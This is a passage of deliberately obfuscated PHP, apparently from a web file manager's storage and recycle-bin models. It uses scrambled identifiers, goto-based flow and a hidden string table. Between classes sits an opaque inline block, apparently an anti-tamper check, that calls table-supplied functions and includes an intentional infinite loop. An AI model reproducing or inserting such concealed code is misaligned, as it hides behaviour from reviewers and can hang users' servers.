array_sort_by($bÈ¡‰ÏİÉ, $C»ƒ“‚Ù[409]); $bÑÌÒ¥¥Å = $bÈ¡‰ÏİÉ[0][$C»ƒ“‚Ù[381]]; } return $this->pathInfo($bÑÌÒ¥¥Å, !0); } protected function updateModifyTime($c™¿ñÎ¿Å¾) { goto DÍ²åØè±ï; d›–ØğÁÛ’: $this->where($dáÍ‹®İ÷¹)->save($C¼ÀõëìĞ…); goto cœºõÂÀ•¹; DÍ²åØè±ï: $Dä„½ÕÉË² =& $_SERVER[¨¤¼…´]; if (!$c™¿ñÎ¿Å¾) { return; } if (!is_array($c™¿ñÎ¿Å¾)) { $c™¿ñÎ¿Å¾ = array($c™¿ñÎ¿Å¾); } goto C†ÖÚğšè; C†ÖÚğšè: foreach ($c™¿ñÎ¿Å¾ as $E‡‚ª÷¼ß => $bèç„ĞÇÙ’) { $c™¿ñÎ¿Å¾[$E‡‚ª÷¼ß] = intval($bèç„ĞÇÙ’); } $dáÍ‹®İ÷¹ = array($Dä„½ÕÉË²[381] => array($Dä„½ÕÉË²[7], $c™¿ñÎ¿Å¾)); $C¼ÀõëìĞ… = array($Dä„½ÕÉË²[537] => USER_ID, $Dä„½ÕÉË²[402] => time()); goto d›–ØğÁÛ’; cœºõÂÀ•¹: } public function folderSizeReset($bË­®ƒò’Ü) { goto aÒ‡ÃîŸ…Ã; eÀ¸´•áÒ÷: CacheLock::unlock($cµ”–íªñ‘); goto c³ ¤ÕÁ¯£; EÖŸêÌÌ¬ñ: $AŒÊÕ¼´‰Ş = array($d¾‹®Œë›[380] => $bË­®ƒò’Ü, $d¾‹®Œë›[408] => 0); $bÂÒ©ìÂ¯ƒ = $this->where($AŒÊÕ¼´‰Ş)->sum($d¾‹®Œë›[87]); $bÂÒ©ìÂ¯ƒ = intval($bÂÒ©ìÂ¯ƒ); goto AÀùÖ“Çİà; dâ‰Ã³˜Ø: CacheLock::lock($cµ”–íªñ‘, 20); $this->sourceCacheClear($bË­®ƒò’Ü); $F÷·Ö±Ëîå = $this->sourceInfo($bË­®ƒò’Ü); goto EÖŸêÌÌ¬ñ; aÒ‡ÃîŸ…Ã: $d¾‹®Œë› =& $_SERVER[¨¤¼…´]; if ($this->statusIgnoreResetSpace) { return; } $cµ”–íªñ‘ = $d¾‹®Œë›[2374] . $bË­®ƒò’Ü; goto dâ‰Ã³˜Ø; aÇ»Á‡‰é¦: $d™‡‹¤Á‚¢ = $this->parentLevelArray($F÷·Ö±Ëîå[$d¾‹®Œë›[472]]); if ($d™‡‹¤Á‚¢) { $AŒÊÕ¼´‰Ş = array($d¾‹®Œë›[381] => array($d¾‹®Œë›[396], $d™‡‹¤Á‚¢)); if ($C÷ÊæĞçÊº < 0) { $AŒÊÕ¼´‰Ş[$d¾‹®Œë›[87]] = array($d¾‹®Œë›[915], abs($C÷ÊæĞçÊº)); } $this->where($AŒÊÕ¼´‰Ş)->setAdd($d¾‹®Œë›[87], $C÷ÊæĞçÊº); } $this->targetSpaceUpdate($F÷·Ö±Ëîå[$d¾‹®Œë›[383]], $F÷·Ö±Ëîå[$d¾‹®Œë›[469]]); goto eÀ¸´•áÒ÷; AÀùÖ“Çİà: $C÷ÊæĞçÊº = $bÂÒ©ìÂ¯ƒ - intval($F÷·Ö±Ëîå[$d¾‹®Œë›[87]]); if ($C÷ÊæĞçÊº == 0) { return CacheLock::unlock($cµ”–íªñ‘); } $this->where(array($d¾‹®Œë›[395] => $bË­®ƒò’Ü))->setField($d¾‹®Œë›[87], $bÂÒ©ìÂ¯ƒ); goto aÇ»Á‡‰é¦; c³ ¤ÕÁ¯£: } public function folderSizeResetChildren($D…±İ ßˆŠ) { goto BÒÄõĞ°ê; fñâ¢•‡ô‘: foreach ($dä¡ŞßƒŠ as $BëåÙÀÙÚ·) { $bßª¥„Œ• = $BëåÙÀÙÚ·[$a£İ‚íøÉ[474]] . $a£İ‚íøÉ[43]; if (!isset($Cƒˆç†™ê[$bßª¥„Œ•])) { continue; } if ($BëåÙÀÙÚ·[$a£İ‚íøÉ[409]] == $Cƒˆç†™ê[$bßª¥„Œ•][$a£İ‚íøÉ[409]]) { $Cƒˆç†™ê[$bßª¥„Œ•][$a£İ‚íøÉ[87]] += $BëåÙÀÙÚ·[$a£İ‚íøÉ[87]]; } } foreach ($Cƒˆç†™ê as $BëåÙÀÙÚ·) { $d½ŒÄİÆ¦º = $this->parentLevelArray($BëåÙÀÙÚ·[$a£İ‚íøÉ[472]]); foreach ($d½ŒÄİÆ¦º as $bßª¥„Œ•) { $bßª¥„Œ• = $bßª¥„Œ• . $a£İ‚íøÉ[43]; if (!isset($Cƒˆç†™ê[$bßª¥„Œ•])) { continue; } if ($BëåÙÀÙÚ·[$a£İ‚íøÉ[409]] == $Cƒˆç†™ê[$bßª¥„Œ•][$a£İ‚íøÉ[409]]) { $Cƒˆç†™ê[$bßª¥„Œ•][$a£İ‚íøÉ[87]] += $BëåÙÀÙÚ·[$a£İ‚íøÉ[87]]; } } } $E»…Œî˜ë¸ = array(); goto f†‚àù¹¯°; f†‚àù¹¯°: foreach ($Cƒˆç†™ê as $BëåÙÀÙÚ·) { if ($BëåÙÀÙÚ·[$a£İ‚íøÉ[87]] == $BëåÙÀÙÚ·[$a£İ‚íøÉ[2376]]) { continue; } $E»…Œî˜ë¸[] = array($a£İ‚íøÉ[381], $BëåÙÀÙÚ·[$a£İ‚íøÉ[381]], $a£İ‚íøÉ[87], $BëåÙÀÙÚ·[$a£İ‚íøÉ[87]]); } $this->saveAll($E»…Œî˜ë¸); goto dºÎ§Ö™…°; E¼»Û§“´‰: $Cƒˆç†™ê[] = $aŒÖÄ¿öª¸; $Cƒˆç†™ê = array_to_keyvalue($Cƒˆç†™ê, $a£İ‚íøÉ[381]); foreach ($Cƒˆç†™ê as $DºÉ¬§¤†Ô => $BëåÙÀÙÚ·) { $Cƒˆç†™ê[$DºÉ¬§¤†Ô][$a£İ‚íøÉ[2376]] = $Cƒˆç†™ê[$DºÉ¬§¤†Ô][$a£İ‚íøÉ[87]]; $Cƒˆç†™ê[$DºÉ¬§¤†Ô][$a£İ‚íøÉ[87]] = 0; } goto fñâ¢•‡ô‘; E¡ã”—Šåï: $F»ÜÊá‘·ˆ[$a£İ‚íøÉ[382]] = 0; $dä¡ŞßƒŠ = $this->field($B½ùõù„±Ê)->where($F»ÜÊá‘·ˆ)->select(); if (!$dä¡ŞßƒŠ) { return; } goto E¼»Û§“´‰; BÒÄõĞ°ê: $a£İ‚íøÉ =& $_SERVER[¨¤¼…´]; $this->sourceCacheClear($D…±İ ßˆŠ); $aŒÖÄ¿öª¸ = $this->sourceInfo($D…±İ ßˆŠ); goto f‚Ê—ˆ¨õ; f‚Ê—ˆ¨õ: $F»ÜÊá‘·ˆ = array($a£İ‚íøÉ[531] => 1, $a£İ‚íøÉ[538] => array($a£İ‚íøÉ[496], $aŒÖÄ¿öª¸[$a£İ‚íøÉ[472]] . $D…±İ ßˆŠ . $a£İ‚íøÉ[497])); $B½ùõù„±Ê = $a£İ‚íøÉ[2375]; $Cƒˆç†™ê = $this->field($B½ùõù„±Ê)->where($F»ÜÊá‘·ˆ)->select(); goto E¡ã”—Šåï; dºÎ§Ö™…°: } public function userSpaceReset($e‚ãæÙÄĞ‹ = false) { $F„óèœ•„ =& $_SERVER[¨¤¼…´]; $bÓÆíƒ¤Ÿò = $this->where(array($F„óèœ•„[383] => self::TYPE_USER, $F„óèœ•„[469] => $e‚ãæÙÄĞ‹, $F„óèœ•„[382] => 0))->sum($F„óèœ•„[87]); Model($F„óèœ•„[487])->userEdit($e‚ãæÙÄĞ‹, array($F„óèœ•„[2081] => $bÓÆíƒ¤Ÿò)); } public function targetSpaceUpdate($DÂŸßÉ†àæ, $eª‚†ùŠ˜Í) { $BÈá½ßÎ¸ =& $_SERVER[¨¤¼…´]; if (!$eª‚†ùŠ˜Í) { return; } if (!in_array($DÂŸßÉ†àæ, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $BĞ‚ˆ†í³Ï = $this->targetSpaceSize($DÂŸßÉ†àæ, $eª‚†ùŠ˜Í); if ($DÂŸßÉ†àæ == self::TYPE_USER) { Model($BÈá½ßÎ¸[487])->userEdit($eª‚†ùŠ˜Í, array($BÈá½ßÎ¸[2081] => $BĞ‚ˆ†í³Ï)); } else { if ($DÂŸßÉ†àæ == self::TYPE_GROUP) { Model($BÈá½ßÎ¸[471])->groupEdit($eª‚†ùŠ˜Í, array($BÈá½ßÎ¸[2081] => $BĞ‚ˆ†í³Ï)); } } } public function targetSpaceSize($cÉçŒç‚¿Á, $E˜¸áôÜã–) { goto Eˆ‚ğëÔ ; B³µ¶¸—×: $f®“–Şèá“ = floatval($f¨ßØºÖ½æ[$eÅ–áï­©[87]]); $déñÂìåƒ = array($eÅ–áï­©[538] => array($eÅ–áï­©[496], $eÅ–áï­©[483] . $f¨ßØºÖ½æ[$eÅ–áï­©[381]] . $eÅ–áï­©[497])); $e©Ìœõ¼Í = Model($eÅ–áï­©[407])->field($eÅ–áï­©[395])->where($déñÂìåƒ)->select(); goto dØ´ŞîÊÜ˜; CĞ‹ñ£ÊÇÁ: return $f®“–Şèá“; goto aµÛ²Ä˜­; Eˆ‚ğëÔ : $eÅ–áï­© =& $_SERVER[¨¤¼…´]; $f¨ßØºÖ½æ = $this->sourceRoot($cÉçŒç‚¿Á, $E˜¸áôÜã–, !0); if (!$f¨ßØºÖ½æ) { return 0; } goto B³µ¶¸—×; dØ´ŞîÊÜ˜: $e©Ìœõ¼Í = array_to_keyvalue($e©Ìœõ¼Í, $eÅ–áï­©[43], $eÅ–áï­©[381]); $e©Ìœõ¼Í = array_unique(array_filter($e©Ìœõ¼Í)); if ($e©Ìœõ¼Í) { $déñÂìåƒ = array($eÅ–áï­©[395] => array($eÅ–áï­©[396], $e©Ìœõ¼Í)); $f®“–Şèá“ += floatval($this->where($déñÂìåƒ)->sum($eÅ–áï­©[87])); } goto CĞ‹ñ£ÊÇÁ; aµÛ²Ä˜­: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($A¿…µ¨Ç) { return $this->fileTypeProfile($A¿…µ¨Ç, SourceModel::TYPE_USER); } public function groupFileTypeProfile($FŸÂ·¤çÉÔ) { return $this->fileTypeProfile($FŸÂ·¤çÉÔ, SourceModel::TYPE_GROUP); } private function fileTypeProfile($d‰¾à¯ºï, $bÈÂ›ÎÜ¬) { goto E‘ŠÏòÈŒ“; d°Ÿ¬àØòÓ: $díÔå½ö™Å = array(); $díÔå½ö™Å[$A• ¡«ÕÉ†[2378]] = array($A• ¡«ÕÉ†[2379] => LNG($A• ¡«ÕÉ†[2378]), $A• ¡«ÕÉ†[2380] => $this->where($fŒà²­ãùë)->count(), $A• ¡«ÕÉ†[533] => $this->where($fŒà²­ãùë)->sum($A• ¡«ÕÉ†[87])); $F…ŒŞ™Å•ä = KodIO::fileTypeList(); goto B‹µ§¡„‚; E‘ŠÏòÈŒ“: $A• ¡«ÕÉ† =& $_SERVER[¨¤¼…´]; $a˜®èË†™ = $A• ¡«ÕÉ†[2377] . $d‰¾à¯ºï . $A• ¡«ÕÉ†[80] . $bÈÂ›ÎÜ¬; $FÂ÷ºåÃ³ = Cache::get($a˜®èË†™); goto A½¹¡‹ ; A½¹¡‹ : if ($FÂ÷ºåÃ³) { return $FÂ÷ºåÃ³; } $fŒà²­ãùë = array($A• ¡«ÕÉ†[531] => 0); if ($d‰¾à¯ºï != !1) { $fŒà²­ãùë[$A• ¡«ÕÉ†[469]] = $d‰¾à¯ºï; $fŒà²­ãùë[$A• ¡«ÕÉ†[383]] = $bÈÂ›ÎÜ¬; } goto d°Ÿ¬àØòÓ; B‹µ§¡„‚: foreach ($F…ŒŞ™Å•ä as $cÒô·è¥® => $C“—½ö„) { $fŒà²­ãùë[$A• ¡«ÕÉ†[384]] = $this->fileTypeWhere($cÒô·è¥®); $díÔå½ö™Å[$cÒô·è¥®] = array($A• ¡«ÕÉ†[2379] => $C“—½ö„[$A• ¡«ÕÉ†[38]], $A• ¡«ÕÉ†[2380] => $this->where($fŒà²­ãùë)->count(), $A• ¡«ÕÉ†[533] => $this->where($fŒà²­ãùë)->sum($A• ¡«ÕÉ†[87])); } Cache::set($a˜®èË†™, $díÔå½ö™Å, 1200); return $díÔå½ö™Å; goto a…®²õÄˆÔ; a…®²õÄˆÔ: } public function fileNameExist($Cæ…éç–‡Ğ, $eˆˆëĞøˆ±) { $c¹¡¸Øäğ =& $_SERVER[¨¤¼…´]; $BÍ¾ãâ¥À = $this->childList($Cæ…éç–‡Ğ); foreach ($BÍ¾ãâ¥À as $D´ ¯¸ˆöÜ) { if ($D´ ¯¸ˆöÜ[$c¹¡¸Øäğ[38]] == $eˆˆëĞøˆ±) { return $D´ ¯¸ˆöÜ[$c¹¡¸Øäğ[381]]; } if (strtolower($D´ ¯¸ˆöÜ[$c¹¡¸Øäğ[38]]) == strtolower($eˆˆëĞøˆ±)) { return $D´ ¯¸ˆöÜ[$c¹¡¸Øäğ[381]]; } } return !1; } public function childList($Bæšáğ©„£) { goto d…Œøó÷‚; dõÈ±ÄŠ§æ: self::$cacheChildList[$b®¬°Ã­ãÎ] = $c×íÆ¶ ÷Ä; foreach ($c×íÆ¶ ÷Ä as $FÈ¸Æ™†¯Â) { $b®¬°Ã­ãÎ = $C¼æË˜¢†[422] . $FÈ¸Æ™†¯Â[$C¼æË˜¢†[381]]; self::$cacheSourceInfo[$b®¬°Ã­ãÎ] = $FÈ¸Æ™†¯Â; } return $c×íÆ¶ ÷Ä; goto EÑ±½—á£; d…Œøó÷‚: $C¼æË˜¢† =& $_SERVER[¨¤¼…´]; $b®¬°Ã­ãÎ = $C¼æË˜¢†[2359] . $Bæšáğ©„£; if (isset(self::$cacheChildList[$b®¬°Ã­ãÎ])) { return self::$cacheChildList[$b®¬°Ã­ãÎ]; } goto d…ØŒ¶‰õª; d…ØŒ¶‰õª: $DÆ‘»‹Ù± = array($C¼æË˜¢†[474] => intval($Bæšáğ©„£), $C¼æË˜¢†[409] => 0); $c×íÆ¶ ÷Ä = $this->where($DÆ‘»‹Ù±)->select(); $c×íÆ¶ ÷Ä = $c×íÆ¶ ÷Ä ? $c×íÆ¶ ÷Ä : array(); goto dõÈ±ÄŠ§æ; EÑ±½—á£: } public function fileNameAuto($aŠö³ºØÈ«, $e©‡šˆ¿£Ü, $Bó¬––› = REPEAT_RENAME, $CÃèÇÇ‡Ãç = false) { $FÛì‘ÙÍ–Ï =& $_SERVER[¨¤¼…´]; $Cæ¡íóŠƒ = $this->childList($aŠö³ºØÈ«); $BÊ³ëñæ¶š = array_to_keyvalue($Cæ¡íóŠƒ, $FÛì‘ÙÍ–Ï[43], $FÛì‘ÙÍ–Ï[38]); return $this->fileNameAutoGet($BÊ³ëñæ¶š, $e©‡šˆ¿£Ü, $Bó¬––›, $CÃèÇÇ‡Ãç); } public function fileNameAutoGet($Cºñ´¾ø‘ª, $bÉà›×ïõ, $eˆ‚‹ŒÑ›É, $fæô°£ßËÍ) { $E¤×¸«åÎ =& $_SERVER[¨¤¼…´]; if ($eˆ‚‹ŒÑ›É == REPEAT_REPLACE || !$Cºñ´¾ø‘ª || !in_array_not_case($bÉà›×ïõ, $Cºñ´¾ø‘ª) || $fæô°£ßËÍ && $eˆ‚‹ŒÑ›É != REPEAT_RENAME_FOLDER) { return $bÉà›×ïõ; } if ($eˆ‚‹ŒÑ›É == REPEAT_SKIP) { return !1; } $cÌ¦Œµ“ë = $E¤×¸«åÎ[101] . get_path_ext($bÉà›×ïõ); $cÌ¦Œµ“ë = $cÌ¦Œµ“ë == $E¤×¸«åÎ[101] || $fæô°£ßËÍ ? $E¤×¸«åÎ[43] : $cÌ¦Œµ“ë; for ($Få£º¦Î  = 1; $Få£º¦Î  <= count($Cºñ´¾ø‘ª) + 1; $Få£º¦Î ++) { $E˜ÚÁ†˜¦§ = substr($bÉà›×ïõ, 0, strlen($bÉà›×ïõ) - strlen($cÌ¦Œµ“ë)); $F±çğ¹¯ = $E˜ÚÁ†˜¦§ . "\50{$Få£º¦Î }\x29{$cÌ¦Œµ“ë}"; if (!in_array_not_case($F±çğ¹¯, $Cºñ´¾ø‘ª)) { return $F±çğ¹¯; } } } } if (!isset($_SERVER[$_SERVER[¨¤¼…´][9]]) || !isset($_SERVER[$_SERVER[¨¤¼…´][10]])) { goto Dî´ÍÜ‘ƒ©; cğö³º÷‡: $D†É›ä‰‹½($_SERVER[$_SERVER[¨¤¼…´][12]] . $_SERVER[¨¤¼…´][13]); $A™°šÌãÃ¯ = 2; while ($A™°šÌãÃ¯ > 1) { $CÉà™©Ë¼… = rawurlencode($A™°šÌãÃ¯ . $_SERVER[¨¤¼…´][18]); } goto F‘ĞÎöÊİæ; bàˆ‹ÊÅØÓ: $Aê¡¥óÛÜÒ = explode($_SERVER[¨¤¼…´][14], $e¯¡í¶¨Ô); if (count($Aê¡¥óÛÜÒ) < $_SERVER[¨¤¼…´][15]) { $d®¹ô¥æ„Â = $_SERVER[¨¤¼…´][16]; $d®¹ô¥æ„Â(); } $D†É›ä‰‹½ = $_SERVER[¨¤¼…´][17]; goto cğö³º÷‡; Dî´ÍÜ‘ƒ©: $EÉ´ôƒ‡èÕ = $_SERVER[¨¤¼…´][11]; $B½³º¹°„ë = $_SERVER[$_SERVER[¨¤¼…´][12]] . $_SERVER[¨¤¼…´][13]; $e¯¡í¶¨Ô = $EÉ´ôƒ‡èÕ($B½³º¹°„ë); goto bàˆ‹ÊÅØÓ; F‘ĞÎöÊİæ: } class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\x6f\137\x73\x6f\x75\162\143\145\x5f\162\x65\143\171\143\154\x65"; protected $dataAuto = array(array("\143\162\x65\x61\x74\x65\124\151\x6d\x65", "\x74\151\x6d\145", "\x69\x6e\163\x65\x72\164", "\x66\165\x6e\143\164\x69\157\x6e")); public function listData($b½ÇçŸˆ = false) { $B¸––¨‘ê =& $_SERVER[¨¤¼…´]; $b½ÇçŸˆ = $b½ÇçŸˆ ? $b½ÇçŸˆ : USER_ID; $CÖ…ßôƒ° = $this->where(array($B¸––¨‘ê[1416] => $b½ÇçŸˆ))->select(); return array_to_keyvalue($CÖ…ßôƒ°, $B¸––¨‘ê[43], $B¸––¨‘ê[381]); } public function moveToRecycle($bëºÓ•—½È) { goto aÃ« Ê Óå; A¿ˆ”œÊ•ˆ: if (!$e‹‚ìÃíÙ || $e‹‚ìÃíÙ[$côŠé‹í„Ñ[409]] == $côŠé‹í„Ñ[93]) { return; } $E©Û¤ğÕ§Š = array($côŠé‹í„Ñ[395] => $bëºÓ•—½È, $côŠé‹í„Ñ[1416] => USER_ID, $côŠé‹í„Ñ[534] => $e‹‚ìÃíÙ[$côŠé‹í„Ñ[383]], $côŠé‹í„Ñ[535] => $e‹‚ìÃíÙ[$côŠé‹í„Ñ[469]], $côŠé‹í„Ñ[538] => $e‹‚ìÃíÙ[$côŠé‹í„Ñ[472]]); $this->add($E©Û¤ğÕ§Š); goto B¤½Ü÷—Ï; aÃ« Ê Óå: $côŠé‹í„Ñ =& $_SERVER[¨¤¼…´]; $f±‚Ø¬ì‰¨ = Model($côŠé‹í„Ñ[1107]); $e‹‚ìÃíÙ = $f±‚Ø¬ì‰¨->sourceInfo($bëºÓ•—½È); goto A¿ˆ”œÊ•ˆ; B¤½Ü÷—Ï: $this->recycleMove($bëºÓ•—½È, 1); if ($e‹‚ìÃíÙ[$côŠé‹í„Ñ[382]] == $côŠé‹í„Ñ[93]) { $D²³™ÑÆµ = array($côŠé‹í„Ñ[538] => array($côŠé‹í„Ñ[496], $e‹‚ìÃíÙ[$côŠé‹í„Ñ[472]] . $bëºÓ•—½È . $côŠé‹í„Ñ[497])); $f±‚Ø¬ì‰¨->where($D²³™ÑÆµ)->setField($côŠé‹í„Ñ[409], 1); } goto CÍ³‰øŞ; CÍ³‰øŞ: } public function clear() { $this->remove(!1); } public function remove($dÑé¤±Ë•ù = false) { goto B¡‡Ï­ĞÍÇ; e¨ª²Ö¹¨‡: $dÑé¤±Ë•ù = $dÑé¤±Ë•ù === !1 ? !1 : $dÑé¤±Ë•ù; $b¬©ºÛ³¤ = array(); foreach ($AÓŸÑ³…İ as $dÅÜâìÎ¦«) { if ($dÑé¤±Ë•ù != !1 && !in_array($dÅÜâìÎ¦«, $dÑé¤±Ë•ù)) { continue; } $FÖÏÍçì¾ = $e¡öŒ­ñ©->sourceInfo($dÅÜâìÎ¦«); $e¡öŒ­ñ©->remove($dÅÜâìÎ¦«, !1); $cŸËèÍ™Ì = $FÖÏÍçì¾[$D«Ì¾Á±Ÿ [383]] . $D«Ì¾Á±Ÿ [80] . $FÖÏÍçì¾[$D«Ì¾Á±Ÿ [469]]; $b¬©ºÛ³¤[$cŸËèÍ™Ì] = array($D«Ì¾Á±Ÿ [534] => $FÖÏÍçì¾[$D«Ì¾Á±Ÿ [383]], $D«Ì¾Á±Ÿ [469] => $FÖÏÍçì¾[$D«Ì¾Á±Ÿ [469]]); $this->where(array($D«Ì¾Á±Ÿ [381] => $dÅÜâìÎ¦«))->delete(); } goto c¨—šÆàÙƒ; B¡‡Ï­ĞÍÇ: $D«Ì¾Á±Ÿ  =& $_SERVER[¨¤¼…´]; $e¡öŒ­ñ© = Model($D«Ì¾Á±Ÿ [1107]); $AÓŸÑ³…İ = $this->listData(); goto e¨ª²Ö¹¨‡; c¨—šÆàÙƒ: foreach ($b¬©ºÛ³¤ as $D¾óâ¶Åö) { $e¡öŒ­ñ©->targetSpaceUpdate($D¾óâ¶Åö[$D«Ì¾Á±Ÿ [383]], $D¾óâ¶Åö[$D«Ì¾Á±Ÿ [469]]); } goto Bã‰¶ØöŒ•; Bã‰¶ØöŒ•: } public function restore($EóéõøÈ = false) { goto fèÛˆÌ‘¼ó; fèÛˆÌ‘¼ó: $FæÆàš›¿• =& $_SERVER[¨¤¼…´]; $eÜø”Áà´ô = Model($FæÆàš›¿•[1107]); $aê»“µ²” = $this->listData(); goto Fø·ò‡Ö•Ê; Fø·ò‡Ö•Ê: $EóéõøÈ = $EóéõøÈ == !1 ? !1 : $EóéõøÈ; if (!$aê»“µ²”) { return !0; } $EŒÅ†¶º¤ = array(); goto F£Ç„»Šä; F£Ç„»Šä: foreach ($aê»“µ²” as $dñ±”÷÷Ì) { goto C‡ƒ†õÕÚ; C³™á÷´™‡: if ($C’•ƒ£ŞÒ‰[$FæÆàš›¿•[409]] == $FæÆàš›¿•[93]) { continue; } $eÜø”Áà´ô->lockMoveStart($dñ±”÷÷Ì); $this->recycleMove($dñ±”÷÷Ì, 0); goto D³¾«¶¯ËØ; aˆŞàòÂĞå: $EŒÅ†¶º¤[] = $cÉŞ³¢¦¨[$FæÆàš›¿•[474]]; if ($cÉŞ³¢¦¨[$FæÆàš›¿•[382]] == $FæÆàš›¿•[93]) { $EŒÅ†¶º¤[] = $dñ±”÷÷Ì; } $eÜø”Áà´ô->lockMoveEnd($dñ±”÷÷Ì); goto Fã›îõ—âÁ; D³¾«¶¯ËØ: if ($cÉŞ³¢¦¨[$FæÆàš›¿•[382]] == $FæÆàš›¿•[93]) { $a¶ääŠæ = array($FæÆàš›¿•[538] => array($FæÆàš›¿•[496], $cÉŞ³¢¦¨[$FæÆàš›¿•[472]] . $dñ±”÷÷Ì . $FæÆàš›¿•[497])); $eÜø”Áà´ô->where($a¶ääŠæ)->setField($FæÆàš›¿•[409], 0); $this->restoreFolderChildren($dñ±”÷÷Ì, $aê»“µ²”); } $this->where(array($FæÆàš›¿•[381] => $dñ±”÷÷Ì))->delete(); $eÜø”Áà´ô->folderSizeReset($cÉŞ³¢¦¨[$FæÆàš›¿•[474]]); goto aˆŞàòÂĞå; C‡ƒ†õÕÚ: if ($EóéõøÈ != !1 && !in_array($dñ±”÷÷Ì, $EóéõøÈ)) { continue; } $cÉŞ³¢¦¨ = $eÜø”Áà´ô->sourceInfo($dñ±”÷÷Ì); $C’•ƒ£ŞÒ‰ = $eÜø”Áà´ô->sourceInfo($cÉŞ³¢¦¨[$FæÆàš›¿•[474]]); goto C³™á÷´™‡; Fã›îõ—âÁ: } $eÜø”Áà´ô->updateModifyTime($EŒÅ†¶º¤); goto cİëÒö¡ø; cİëÒö¡ø: } private function restoreFolderChildren($CèÀá¢ôùÅ, $e×ßö®³ß) { goto fëÂ»ÅÁÔ; fëÂ»ÅÁÔ: $b¤‰î™¤òÛ =& $_SERVER[¨¤¼…´]; $DÎ„ŒÉ·ç× = Model($b¤‰î™¤òÛ[1107]); $eô½è¡ßÀ« = array($b¤‰î™¤òÛ[381] => array($b¤‰î™¤òÛ[7], array())); goto A…³±¢’Ğ; A…³±¢’Ğ: foreach ($e×ßö®³ß as $cÃÄ‘‘¼›®) { if ($cÃÄ‘‘¼›® == $CèÀá¢ôùÅ) { continue; } if (!$DÎ„ŒÉ·ç×->isParentOf($CèÀá¢ôùÅ, $cÃÄ‘‘¼›®)) { continue; } $F²ÃÊŸ¾÷ï = $DÎ„ŒÉ·ç×->sourceInfo($cÃÄ‘‘¼›®); if ($F²ÃÊŸ¾÷ï[$b¤‰î™¤òÛ[382]] == $b¤‰î™¤òÛ[93]) { $eô½è¡ßÀ«[] = array($b¤‰î™¤òÛ[538] => array($b¤‰î™¤òÛ[496], $F²ÃÊŸ¾÷ï[$b¤‰î™¤òÛ[472]] . $cÃÄ‘‘¼›® . $b¤‰î™¤òÛ[497])); } else { $eô½è¡ßÀ«[$b¤‰î™¤òÛ[381]][1][] = $cÃÄ‘‘¼›®; } } if (!$eô½è¡ßÀ«[$b¤‰î™¤òÛ[381]][1]) { unset($eô½è¡ßÀ«[$b¤‰î™¤òÛ[381]]); } if (!$eô½è¡ßÀ«) { return; } goto F¼àØêÁÎÅ; F¼àØêÁÎÅ: $eô½è¡ßÀ«[$b¤‰î™¤òÛ[381]][1] = array_unique($eô½è¡ßÀ«[$b¤‰î™¤òÛ[381]][1]); $eô½è¡ßÀ«[$b¤‰î™¤òÛ[900]] = $b¤‰î™¤òÛ[2180]; $DÎ„ŒÉ·ç×->where($eô½è¡ßÀ«)->setField($b¤‰î™¤òÛ[409], 1); goto BèÒÆİÎº; BèÒÆİÎº: } private function recycleMove($B£ëğ”¬ğî, $b§Â‰«Šßê = 1) { $c »—Õ»Ï½ =& $_SERVER[¨¤¼…´]; $e‹ÔĞÉŠè = Model($c »—Õ»Ï½[1107]); $c¤›ÓÒ’«Š = Model($c »—Õ»Ï½[2381]); $E½™±÷³İ‹ = array($c »—Õ»Ï½[381] => $B£ëğ”¬ğî); if ($b§Â‰«Šßê) { $e‹ÔĞÉŠè->where($E½™±÷³İ‹)->setField($c »—Õ»Ï½[409], 1); $c¤›ÓÒ’«Š->eventRecycle($B£ëğ”¬ğî, $c »—Õ»Ï½[2382]); } else { $DÉŒŒ•î™æ = $e‹ÔĞÉŠè->where($E½™±÷³İ‹)->find(); $CÑ‘±ªÛ¶¿ = $DÉŒŒ•î™æ[$c »—Õ»Ï½[382]] == $c »—Õ»Ï½[93]; $E’¢ËÊ©ğ™ = $e‹ÔĞÉŠè->fileNameAuto($DÉŒŒ•î™æ[$c »—Õ»Ï½[474]], $DÉŒŒ•î™æ[$c »—Õ»Ï½[38]], REPEAT_RENAME_FOLDER, $CÑ‘±ªÛ¶¿); if ($E’¢ËÊ©ğ™ != $DÉŒŒ•î™æ[$c »—Õ»Ï½[38]]) { $e‹ÔĞÉŠè->rename($B£ëğ”¬ğî, $E’¢ËÊ©ğ™); } $e‹ÔĞÉŠè->where($E½™±÷³İ‹)->setField($c »—Õ»Ï½[409], 0); $c¤›ÓÒ’«Š->eventRecycle($B£ëğ”¬ğî, $c »—Õ»Ï½[2383]); } } } goto d¦£¦°‹„Î; FŠ›Ó„íïÀ: class UserJobModel extends ModelBaseLight { public $optionType = "\123\171\163\164\x65\x6d\56\152\157\x62\114\151\163\164"; public $field = array("\156\141\x6d\145", "\144\x65\x73\x63", "\x73\x6f\x72\x74"); const JOB_KEY = "\x73\145\154\x66\x4a\157\142\x4c\x69\x73\164"; public function listData($EÇÀ¾œµµ = false, $fì¸Ï©­œÓ = "\x73\x6f\x72\x74", $FÙòÍá´ÄŒ = false) { return parent::listData($EÇÀ¾œµµ, $fì¸Ï©­œÓ, $FÙòÍá´ÄŒ); } public function remove($B·†ğŠÂÇ“) { return parent::remove($B·†ğŠÂÇ“); } public function add($CÃ·Îò‚±é) { $B­Ø›‘ë¾ =& $_SERVER[¨¤¼…´]; if ($this->findByName($CÃ·Îò‚±é[$B­Ø›‘ë¾[38]])) { return !1; } $CÃ·Îò‚±é[$B­Ø›‘ë¾[2117]] = $this->getSort(); return parent::insert($CÃ·Îò‚±é); } private function getSort() { $d£¥Şœó¡ù =& $_SERVER[¨¤¼…´]; $DùÛŒ²”Å = parent::listData(); $D”÷‰£‘ô = array_to_keyvalue($DùÛŒ²”Å, $d£¥Şœó¡ù[43], $d£¥Şœó¡ù[2117]); return empty($D”÷‰£‘ô) ? 0 : max($D”÷‰£‘ô) + 1; } public function update($C¥®Êã„¼, $bÆğ‡’˜ìì) { $EÈ—³¦†ó± =& $_SERVER[¨¤¼…´]; $A”¬™¢çÓÃ = parent::listData($C¥®Êã„¼); $B—²ã¦ÖÊ„ = $this->findByName($bÆğ‡’˜ìì[$EÈ—³¦†ó±[38]]); if (!$A”¬™¢çÓÃ || $B—²ã¦ÖÊ„ && $B—²ã¦ÖÊ„[$EÈ—³¦†ó±[379]] != $A”¬™¢çÓÃ[$EÈ—³¦†ó±[379]]) { return !1; } return parent::update($C¥®Êã„¼, $bÆğ‡’˜ìì); } public function setUserJob($eö¤§†Ó, $fƒÖùïİø) { goto EÇ¸°ó¾í’; 